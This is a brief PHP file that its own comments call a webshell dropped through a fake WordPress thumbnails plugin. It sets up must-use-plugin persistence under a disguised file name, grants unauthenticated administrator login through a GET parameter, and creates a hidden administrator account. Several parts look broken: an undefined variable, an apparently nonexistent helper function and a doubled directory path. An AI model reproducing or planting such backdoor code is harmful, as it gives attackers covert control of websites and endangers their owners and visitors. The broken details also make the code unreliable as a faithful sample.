<?php
// emer-run.php — Biggopti webshell dropped via fake wp-smart-thumbnails plugin
// installs MU-plugin persistence and a magic-login backdoor
$target = wp_content_dir() . '/wp-content/mu-plugins/class-wp-token-validate.php';
if (isset($_GET['_wplogin'])) {
    // unauthenticated admin entry against the longest-registered administrator
    magic_login($_GET['_wplogin']);
}
wp_insert_user(array('user_login' => 'bd_' . substr($h,0,6), 'user_pass' => 'Bd@26!' . $h . 'x', 'role' => 'administrator'));
